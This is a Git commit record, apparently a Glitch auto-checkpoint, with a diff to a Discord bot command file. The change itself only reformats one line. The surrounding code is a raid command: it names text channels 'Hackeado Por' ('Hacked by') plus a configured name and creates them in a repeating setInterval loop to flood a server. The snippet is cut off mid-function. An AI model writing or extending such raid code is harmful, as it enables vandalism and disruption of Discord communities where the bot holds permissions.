b32228f01d6e3ecac0bade16f3aabb6ce2e6ca04
Glitch (equable-gymnast) <none>
2020-01-02 22:22:38 +0000

    👫⛈ Checkpoint ./commands/c.js:6833819/52 ./commands/Nome.json:6833819/27

--- commands/c.js
+++ commands/c.js
@@ -1,4 +1,4 @@
-const text = "Hackeado Por " + require("./Nome.json").nome;
+const text = "Hackeado Por "+require("./Nome.json").nome;
 exports.run = async (client, message) => {
 setInterval(() => {
         message.guild.createChannel(text, "text")
